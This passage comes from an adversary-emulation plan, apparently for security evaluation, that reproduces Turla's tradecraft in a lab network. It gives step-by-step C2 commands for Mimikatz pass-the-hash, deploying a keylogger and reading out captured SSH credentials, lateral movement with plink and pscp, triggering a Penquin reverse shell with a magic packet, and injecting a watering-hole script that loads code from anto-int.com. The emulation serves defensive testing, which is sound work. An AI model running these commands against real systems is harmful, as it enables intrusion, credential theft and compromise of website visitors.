to <code v-pre>C:\Windows\Temp</code> before moving both executables to <code v-pre>C:\Windows\System32\</code>.</p>
<p>Next, using the Mimikatz binary previously downloaded to the domain controller
and Adalwolfa&#x27;s discovered NTLM hash, CARBON-DLL performs pass-the-hash to copy
the installer to Adalwolfa&#x27;s workstation and PsExec to remotely execute the
installer to install CARBON-DLL on Adalwolfa&#x27;s workstation.</p>
<hr>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Return to your RDP session to <code v-pre>bannik (10.20.10.9)</code> as <code v-pre>Frieda</code>.
Minimize (do not close) the <code v-pre>bannik (10.20.10.9)</code> RDP window.</p>
<ul>
<li>Start a new RDP session to <code v-pre>khabibulin (10.20.20.104)</code> as <code v-pre>adalwolfa</code>:</li>
</ul>
<div class="table-wrapper scrollbar overflow-hidden">
<table class="comfortable">
<thead>
<tr>
<th style="text-align: center;">Username</th>
<th style="text-align: center;">Password</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center;">skt\adalwolfa</td>
<td style="text-align: center;">Password2!</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li><p>Close any spurious windows</p>
</li>
<li><p>Open up Edge, but don&#x27;t browse to any website just yet. The browser process is needed for Carbon comms lib DLL injection to occur.</p>
</li>
</ul>
<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Wait 1 minute and return to your Kali control server terminal</p>
<ul>
<li>Task the CARBON-DLL implant on the domain controller to download PsExec.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task a3e63922 '{&quot;id&quot;: 4, &quot;payload&quot;: &quot;PsExec.exe&quot;, &quot;payload_dest&quot;: &quot;C:\\Windows\\Temp\\tmp5712.tmp&quot;, &quot;cmd&quot;: &quot;move C:\\Windows\\Temp\\tmp5712.tmp C:\\Windows\\System32\\wsqsp.exe &amp;&amp; dir C:\\Windows\\System32\\wsqsp.exe&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li>Wait 1 minute and then task the CARBON-DLL implant on the domain controller
to download a third copy of the CARBON-DLL installer.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task a3e63922 '{&quot;id&quot;: 5, &quot;payload&quot;: &quot;carbon_installer_3.exe&quot;, &quot;payload_dest&quot;: &quot;C:\\Windows\\Temp\\tmp1283.tmp&quot;, &quot;cmd&quot;: &quot;move C:\\Windows\\Temp\\tmp1283.tmp C:\\Windows\\System32\\wsqmanager.exe &amp;&amp; dir C:\\Windows\\System32\\wsqmanager.exe&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li>Wait 1 minute and then task the CARBON-DLL implant on the domain controller
to use the previously downloaded Mimikatz to pass-the-hash and (1) copy the
installer to Adalwolfa&#x27;s workstation and (2) execute it using PsExec.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task a3e63922 '{&quot;id&quot;: 6, &quot;cmd&quot;: &quot;C:\\Windows\\System32\\terabox.exe \&quot;pr::d\&quot; \&quot;slsa::htp /user:adalwolfa /domain:skt /ntlm:07d128430a6338f8d537f6b3ae1dc136 /remotepc:khabibulin /pexe:C:\\Windows\\System32\\wsqsp.exe /sys:1 /prun:C:\\Windows\\System32\\wsqmanager.exe\&quot; \&quot;quit\&quot;&quot;}'</code></pre>
</doc-codeblock></div>
<p><span class="docs-emoji">&#x2757;</span> Verify that a new Carbon implant has been registered with the control server.</p>
<ul>
<li>Wait 1 minute and then task the CARBON-DLL implant on the domain controller to clean up dropped files.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task a3e63922 '{&quot;id&quot;: 7, &quot;cmd&quot;: &quot;del /Q C:\\Windows\\System32\\terabox.exe C:\\Windows\\System32\\wsqsp.exe C:\\Windows\\System32\\wsqmanager.exe&quot;}'</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="source-code">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="../../../resources/carbon/carboninstaller/">CARBON-DLL installer</a>
<ul>
<li><a href="../../../resources/carbon/carboninstaller/dropper/src/file_handler.cpp#L178">Drop components</a></li>
<li><a href="../../../resources/carbon/carboninstaller/dropper/src/service_handler.cpp#L170">Create Loader Service</a>
<ul>
<li>Service registry edits: <a href="../../../resources/carbon/carboninstaller/dropper/src/service_handler.cpp#L230">1</a>, <a href="../../../resources/carbon/carboninstaller/dropper/src/service_handler.cpp#L284">2</a></li>
</ul>
</li>
<li><a href="../../../resources/carbon/carboninstaller/dropper/src/service_handler.cpp#L354">Start Loader Service</a></li>
<li><a href="../../../resources/carbon/carboninstaller/loader/src/service.cpp">Loader Service</a></li>
</ul>
</li>
<li><a href="../../../resources/carbon/orchestrator/">CARBON-DLL Orchestrator</a>
<ul>
<li><a href="../../../resources/carbon/orchestrator/src/injection.cpp#L454">Comms Lib DLL Injection</a></li>
<li><a href="../../../resources/carbon/orchestrator/src/tasking.cpp#L388">Task Execution</a></li>
</ul>
</li>
<li><a href="../../../resources/carbon/commlib/">CARBON-DLL Comms Lib</a>
<ul>
<li><a href="../../../resources/carbon/commlib/src/commlib.cpp#L313">Beacon and task/payload retrieval over HTTP</a></li>
<li><a href="../../../resources/carbon/commlib/src/commlib.cpp#L342">Upload task output over HTTP</a></li>
<li><a href="../../../resources/carbon/commlib/src/namedpipep2p.cpp">Peer to peer communications over named pipes</a></li>
</ul>
</li>
<li><a href="../../../resources/mimikatz/">Mimikatz</a></li>
</ul>
<doc-anchor-target id="cited-intelligence">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html">https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html</a></li>
<li><a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments">https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/waterbug-espionage-governments</a></li>
<li><a href="https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/">https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/</a></li>
<li><a href="https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/">https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/</a></li>
</ul>
<br>
<doc-anchor-target id="step-8---credential-access-on-admin-host">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-8---credential-access-on-admin-host">#</doc-anchor-trigger>
        <span>Step 8 - Credential Access on Admin Host</span>
    </h2>
</doc-anchor-target>
<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
<p>Step 8 emulates Turla dropping a custom keylogger binary (<code v-pre>wingtsvcupdt.exe</code>) on
<code v-pre>Adalwolfa</code>&#x27;s workstation and harvesting credentials from the system.</p>
<p>Once the tools have been dropped by the CARBON-DLL, the keylogger is executed
and begins logging keystrokes to <code v-pre>%temp%\~DFA512.tmp</code> The keylogger is used
to collect SSH credentials that <code v-pre>Adalwolfa</code> was using on their system while the
keylogger was running.</p>
<p>Meanwhile, Adalwolfa is using their Edge browser session to visit the website
hosted by the Apache server to check one of the pages. The user then opens
PowerShell and connects to the Apache server via SSH, where their plaintext
credentials are captured by the keylogger. <code v-pre>Adalwolfa</code> then navigates to the
directory containing the webpage file on the Apache server and opens the file
to make a small change.</p>
<hr>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li>From your Kali C2 server terminal window, task the CARBON-DLL on Adalwolfa&#x27;s workstation to download and execute the
keylogger binary in the background:</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task c6f2aa03 '{&quot;id&quot;: 0, &quot;payload&quot;: &quot;keylogger.exe&quot;, &quot;payload_dest&quot;: &quot;C:\\Windows\\Temp\\wingtsvcupdt.exe&quot;, &quot;cmd&quot;: &quot;C:\\Windows\\Temp\\wingtsvcupdt.exe -r&quot;}'</code></pre>
</doc-codeblock></div>
<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Wait 1 minute and then return to your RDP session to <code v-pre>khabibulin (10.20.20.104)</code> as <code v-pre>adalwolfa</code>.</p>
<ul>
<li><p>From the workstation, as the <code v-pre>Adalwolfa</code> user account:</p>
<ul>
<li>Open Edge.</li>
<li><span class="docs-emoji">&#x2757;</span> <strong>Type in full, do not copy or autocomplete,</strong> <a href="http://kagarov/index.html">http://kagarov/index.html</a> into the address bar and press enter.</li>
</ul>
</li>
<li><p>Open a PowerShell terminal and <strong>type do not copy</strong> the SSH command:</p>
</li>
</ul>
<p>ssh <a href="mailto:adalwolfa@10.20.10.23">adalwolfa@10.20.10.23</a></p>
<ul>
<li><p><strong>Type do not copy</strong> the SSH password <code v-pre>Password2!</code> when prompted.</p>
</li>
<li><p>Within the SSH session, <strong>type do not copy</strong> the follow commands as
<code v-pre>Adalwolfa</code>:</p>
</li>
</ul>
<ol>
<li><code v-pre>sudo nano /var/www/html/index.html</code></li>
<li>Go to line 198 with <code v-pre>CTRL + SHIFT + -</code> then type 198</li>
<li>Replace <code v-pre>Apache2 Ubuntu Default Page</code> with <code v-pre>Adalwolfa's Page</code></li>
<li>save the file with <code v-pre>CTRL + X</code>, <code v-pre>Y</code>, <code v-pre>enter</code></li>
<li>Type <code v-pre>exit</code> to exit from the SSH session</li>
</ol>
<p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> Return to the Kali C2 server and task the CARBON-DLL implant
on Adalwolfa&#x27;s workstation to kill the keylogger process.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task c6f2aa03 '{&quot;id&quot;: 1, &quot;cmd&quot;: &quot;taskkill /IM wingtsvcupdt.exe /F&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li>Wait 1 minute and then task the CARBON-DLL implant to exfiltrate the data written
to the keylogger file:</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task c6f2aa03 '{&quot;id&quot;: 2, &quot;cmd&quot;: &quot;type %temp%\\~DFA512.tmp&quot;}'</code></pre>
</doc-codeblock></div>
<p><span class="docs-emoji">&#x2757;</span> Verify that the keystrokes were logged containing the website information and Adalwolfa&#x27;s SSH credentials.</p>
<ul>
<li>Wait 1 minute and then task the CARBON-DLL implant to remove the keylogger and keylogger output file:</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task c6f2aa03 '{&quot;id&quot;: 3, &quot;cmd&quot;: &quot;del /Q C:\\Windows\\Temp\\wingtsvcupdt.exe %temp%\\~DFA512.tmp&quot;}'</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="source-code">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="../../../resources/carbon/orchestrator/">CARBON-DLL Orchestrator</a>
<ul>
<li><a href="../../../resources/carbon/orchestrator/src/tasking.cpp#L388">Task Execution</a></li>
</ul>
</li>
<li><a href="../../../resources/carbon/commlib/">CARBON-DLL Comms Lib</a>
<ul>
<li><a href="../../../resources/carbon/commlib/src/commlib.cpp#L313">Beacon and task/payload retrieval over HTTP</a></li>
<li><a href="../../../resources/carbon/commlib/src/commlib.cpp#L342">Upload task output over HTTP</a></li>
</ul>
</li>
<li><a href="../../../resources/keylogger/">Keylogger</a>
<ul>
<li><a href="../../../resources/keylogger/keylogger/keylogger/keylogger.cpp#L41">Current hostname discovery</a></li>
<li><a href="../../../resources/keylogger/keylogger/keylogger/keylogger.cpp#L579">Token manipulation and session discovery to restart in active session</a></li>
<li><a href="../../../resources/keylogger/keylogger/keylogger/keylogger.cpp#L349">Keylogging hook routine</a></li>
<li><a href="../../../resources/keylogger/keylogger/keylogger/keylogger.cpp#L719">Set keylogging hook</a></li>
<li><a href="../../../resources/keylogger/keylogger/keylogger/keylogger.cpp#L419">Active window discovery</a></li>
</ul>
</li>
</ul>
<doc-anchor-target id="cited-intelligence">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="https://securelist.com/the-epic-turla-operation/65545/">https://securelist.com/the-epic-turla-operation/65545/</a></li>
<li><a href="https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html">https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html</a></li>
<li><a href="https://blog.talosintelligence.com/2021/09/tinyturla.html">https://blog.talosintelligence.com/2021/09/tinyturla.html</a></li>
<li><a href="https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/">https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/</a></li>
</ul>
<br>
<doc-anchor-target id="step-9---lateral-movement-to-linux-server">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-9---lateral-movement-to-linux-server">#</doc-anchor-trigger>
        <span>Step 9 - Lateral Movement to Linux Server</span>
    </h2>
</doc-anchor-target>
<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
<p>Step 9 emulates Turla laterally moving to the Linux Apache server and
installing Penquin.</p>
<p>First, the third CARBON-DLL implant downloads Penquin and <code v-pre>pscp.exe</code> to
Adalwolfa&#x27;s workstation, where <code v-pre>pscp.exe</code> is used with the credentials keylogged
in the previous step to copy Penquin over to the Apache server. Next,
CARBON-DLL downloads changes to the cron service to Adalwolfa&#x27;s workstation and uses
pscp.exe to also copy the changes to the Apache server.</p>
<p>Lastly, CARBON-DLL downloads <code v-pre>plink.exe</code> and, using the credentials keylogged in
the previous step, executes Penquin on the Apache server.</p>
<p>Penquin performs the following actions:</p>
<ul>
<li>Unpacking a binary (the compiled sniffer) named <code v-pre>cron</code> and adding executable permissions</li>
<li>Copying <code v-pre>cron</code> into <code v-pre>/usr/bin/</code> as <code v-pre>cron</code></li>
<li>Stopping the cron service</li>
<li>Creating a cron service file in the <code v-pre>/etc/systemd/system/</code> folder for <code v-pre>systemd</code> to execute our cron. Note: The system executes our fake cron before the systems real cron because files located in <code v-pre>/etc/systemd/system/</code> are executed before files in the <code v-pre>/usr/sbin/cron</code></li>
<li>Reloading and starting the cron service</li>
<li>Our cron service installs the sniffer and executes real cron as a child process</li>
</ul>
<p>In summary, Penquin installs a BPF filter and listens on the Apache server&#x27;s network interface for a specific activation packet.</p>
<hr>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li>From your Kali C2 server terminal, task the CARBON-DLL implant on Adawolfa&#x27;s workstation
to download Penquin (named <code v-pre>tmp504e.tmp</code>).</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task c6f2aa03 '{&quot;id&quot;: 4, &quot;payload&quot;: &quot;hsperfdata.zip&quot;, &quot;payload_dest&quot;: &quot;C:\\Windows\\Temp\\tmp504e.tmp&quot;, &quot;cmd&quot;: &quot;dir C:\\Windows\\Temp\\tmp504e.tmp&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li>Wait 1 minute and then task the implant to download <code v-pre>pscp.exe</code></li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task c6f2aa03 '{&quot;id&quot;: 5, &quot;payload&quot;: &quot;pscp.exe&quot;, &quot;payload_dest&quot;: &quot;C:\\Windows\\Temp\\pscp.exe&quot;, &quot;cmd&quot;: &quot;move C:\\Windows\\Temp\\pscp.exe C:\\Windows\\System32\\pscp.exe &amp;&amp; dir C:\\Windows\\System32\\pscp.exe&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li>Wait 1 minute and then task the implant to copy Penquin to the Apache web server using Adalwolfa&#x27;s credentials.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task c6f2aa03 '{&quot;id&quot;: 6, &quot;cmd&quot;: &quot;echo y | C:\\Windows\\System32\\pscp.exe -pw Password2! C:\\Windows\\Temp\\tmp504e.tmp adalwolfa@10.20.10.23:/tmp/tmp514f524f&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li>Wait 1 minute and then task the implant to download <code v-pre>plink.exe</code></li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task c6f2aa03 '{&quot;id&quot;: 7, &quot;payload&quot;: &quot;plink.exe&quot;, &quot;payload_dest&quot;: &quot;C:\\Windows\\Temp\\plink.exe&quot;, &quot;cmd&quot;: &quot;move C:\\Windows\\Temp\\plink.exe C:\\Windows\\System32\\plink.exe &amp;&amp; dir C:\\Windows\\System32\\plink.exe&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li>Wait 1 minute and then task the implant to execute Penquin (Penquin takes ~8 seconds to execute).</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task c6f2aa03 '{&quot;id&quot;: 8, &quot;cmd&quot;: &quot;(echo unzip /tmp/tmp514f524f -d /tmp &amp; echo sudo mv /tmp/hsperfdata /root/hsperfdata &amp; echo sudo /root/hsperfdata &amp; echo exit) | C:\\Windows\\System32\\plink.exe -ssh -l adalwolfa -pw Password2! 10.20.10.23&quot;}'</code></pre>
</doc-codeblock></div>
<ul>
<li>Ensure no commands returned errors in the plink output:</li>
</ul>
<blockquote>
</blockquote>
<ul>
<li>
<blockquote>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">unzip /tmp/tmp514f524f -d /tmp 

sudo mv /tmp/hsperfdata /root/hsperfdata 

sudo /root/hsperfdata 

exit 

adalwolfa@skt.local@kagarov:~$ unzip /tmp/tmp514f524f -d /tmp 
Archive:  /tmp/tmp514f524f
  inflating: /tmp/hsperfdata         
adalwolfa@skt.local@kagarov:~$ 
adalwolfa@skt.local@kagarov:~$ sudo mv /tmp/hsperfdata /root/hsperfdata 
adalwolfa@skt.local@kagarov:~$ 
adalwolfa@skt.local@kagarov:~$ sudo /root/hsperfdata 
adalwolfa@skt.local@kagarov:~$ 
adalwolfa@skt.local@kagarov:~$ exit 
logout</code></pre>
</doc-codeblock></div>
</blockquote>
</li>
<li><p>Wait 1 minute and then task the implant to clean up downloaded files</p>
</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">./evalsC2client.py --set-task c6f2aa03 '{&quot;id&quot;: 9, &quot;cmd&quot;: &quot;del /Q C:\\Windows\\Temp\\tmp504e.tmp C:\\Windows\\System32\\pscp.exe C:\\Windows\\System32\\plink.exe&quot;}'</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="source-code">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="../../../resources/carbon/orchestrator/">CARBON-DLL Orchestrator</a>
<ul>
<li><a href="../../../resources/carbon/orchestrator/src/tasking.cpp#L388">Task Execution</a></li>
</ul>
</li>
<li><a href="../../../resources/carbon/commlib/">CARBON-DLL Comms Lib</a>
<ul>
<li><a href="../../../resources/carbon/commlib/src/commlib.cpp#L313">Beacon and task/payload retrieval over HTTP</a></li>
<li><a href="../../../resources/carbon/commlib/src/commlib.cpp#L342">Upload task output over HTTP</a></li>
</ul>
</li>
<li><a href="../../../resources/penquin/">Penquin</a> (<a href="../../../resources/penquin/sniff.c">Network Sniffer</a>, <a href="../../../resources/penquin/main.c">Penquin Installer</a>, &amp; <a href="../../../resources/penquin/crypt.h#L60">Obfuscation Algorithm</a>)
<ul>
<li><a href="../../../resources/penquin/main.c#L220">Writes the sniffer (Penquin) to disk</a></li>
<li><a href="../../../resources/penquin/main.c#L121">Moves Penquin to /usr/bin</a></li>
<li><a href="../../../resources/penquin/main.c#L173">Creates a service file</a></li>
<li><a href="../../../resources/penquin/main.c#L143">Stops cron service</a></li>
<li><a href="../../../resources/penquin/main.c#L198">Executes Penquin as cron</a></li>
<li><a href="../../../resources/penquin/sniff.c#L198">Real cron starts as child process</a></li>
<li><a href="../../../resources/penquin/sniff.c#L482">Installs packet sniffer on eth0</a></li>
<li><a href="../../../resources/penquin/sniff.c#L437-L442">Magic packet filter criteria</a></li>
<li><a href="../../../resources/penquin/sniff.c#L405">Execute reverse shell</a></li>
</ul>
</li>
</ul>
<doc-anchor-target id="cited-intelligence">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf">https://www.leonardo.com/documents/20142/10868623/Malware+Technical+Insight+_Turla+%E2%80%9CPenquin_x64%E2%80%9D.pdf</a></li>
<li><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180251/Penquins_Moonlit_Maze_PDF_eng.pdf">https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180251/Penquins_Moonlit_Maze_PDF_eng.pdf</a></li>
<li><a href="https://securelist.com/the-penquin-turla-2/67962/">https://securelist.com/the-penquin-turla-2/67962/</a></li>
<li><a href="https://www.youtube.com/watch?v=JXsjRUxx47E&amp;t=647s">https://www.youtube.com/watch?v=JXsjRUxx47E&amp;t=647s</a></li>
<li><a href="https://lab52.io/blog/looking-for-penquins-in-the-wild/">https://lab52.io/blog/looking-for-penquins-in-the-wild/</a></li>
</ul>
<br>
<doc-anchor-target id="step-10---installation-of-watering-hole">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#step-10---installation-of-watering-hole">#</doc-anchor-trigger>
        <span>Step 10 - Installation of Watering Hole</span>
    </h2>
</doc-anchor-target>
<p><span class="docs-emoji">&#x1F3A4;</span> <code v-pre>Voice Track:</code></p>
<p>Step 10 emulates Turla sending a magic packet to the Apache server, on which
the sniffer component of Penquin reads the magic packet, parses the packet
for the IP address to connect to, and triggers the establishment of a reverse
shell.</p>
<p>First, a few discovery commands are sent through the established reverse shell.
Aditional HTML is then appended to the webpage previously edited by Adalwolfa,
containing script tags that load another simple JavaScript file hosted by the
adversary&#x27;s malicious site, anto-int[.]com, that redirects users who browse to <code v-pre>http://kagarov/index.html</code> to
the adversary&#x27;s malicious site instead, thus completing the installation of the
watering hole.</p>
<hr>
<doc-anchor-target id="procedures">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#procedures">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x2623;&#xFE0F;</span> Procedures</span>
    </h3>
</doc-anchor-target>
<ul>
<li><p><span class="docs-emoji">&#x27A1;&#xFE0F;</span> From your Kali C2 server terminal, open a new terminal tab using Ctrl+Shift+T. Recommended: rename the new tab to <code v-pre>Penquin NC</code></p>
</li>
<li><p>In the new tab, set up a Netcat listener for Penquin&#x27;s reverse shell to connect to:</p>
</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">nc -lvvp 8081</code></pre>
</doc-codeblock></div>
<ul>
<li>Right click and split the window horizontally. Run the following commands to send the magic packet to the Apache server using
the <code v-pre>sendPacket.py</code> utility.</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">cd /opt/day1/turla
sudo -E python3 Resources/Penquin/sendPacket.py --handler_ip 176.59.15.33 --handler_port 8081 --target_ip 10.20.10.23 --target_port 8080 --payload_type base64</code></pre>
</doc-codeblock></div>
<ul>
<li><p>Wait a few seconds and then check the Netcat tab (<code v-pre>Penquin NC</code>). The Netcat prompt should report a successful connection.</p>
</li>
<li><p>In the terminal where the reverse shell has connected to the Netcat listener, paste the following command to add the
watering hole redirection to index.html:</p>
</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">echo &quot;&lt;script&gt;if (document.getElementById('xyz')) {{}} else {{ var gam = document.createElement('script'); gam.type = 'text/javascript'; gam.async = true; gam.src = ('http://anto-int.com/counter.js'); var sm = document.getElementsByTagName('script')[0]; sm.parentNode.insertBefore(gam, sm); var fl = document.createElement('span'); fl.id = 'xyz'; var d =  document.getElementsByTagName('div')[0]; d.parentNode.insertBefore(fl, d);}}&lt;/script&gt;&quot; &gt;&gt; /var/www/html/index.html</code></pre>
</doc-codeblock></div>
<ul>
<li>Note - this command does not return output. Wait 1 minute and then send the following command to close the reverse shell</li>
</ul>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">exit</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="source-code">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#source-code">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F5FF;</span> Source Code</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="../../../resources/penquin/">Penquin</a>
<ul>
<li><a href="../../../resources/penquin/sendpacket.py">sendPacket.py</a></li>
</ul>
</li>
</ul>
<doc-anchor-target id="cited-intelligence">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#cited-intelligence">#</doc-anchor-trigger>
        <span><span class="docs-emoji">&#x1F52C;</span> Cited Intelligence</span>
    </h3>
</doc-anchor-target>
<ul>
<li><a href="https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/">https://www.welivesecurity.com/2020/03/12/tracking-turla-new-backdoor-armenian-watering-holes/</a></li>
<li><a href="https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf">https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf</a></li>
<li><a href="https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf">https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf</a></li>
</ul>

                                
                                <!-- Required only on API pages -->
                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                            </div>
                            <footer class="clear-both">
                            
                                <nav class="flex mt-14">
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../../enterprise/turla/emulation_plan/carbon_scenario/carbon_protections_scenario/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                            <span>
                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
                                                <span class="block mt-1">Carbon Protections Scenario</span>
                                            </span>
                                        </a>
                                    </div>
                            
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../../enterprise/turla/emulation_plan/snake_scenario/">
                                            <span>
                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
                                                <span class="block mt-1">Snake Scenario</span>
                                            </span>
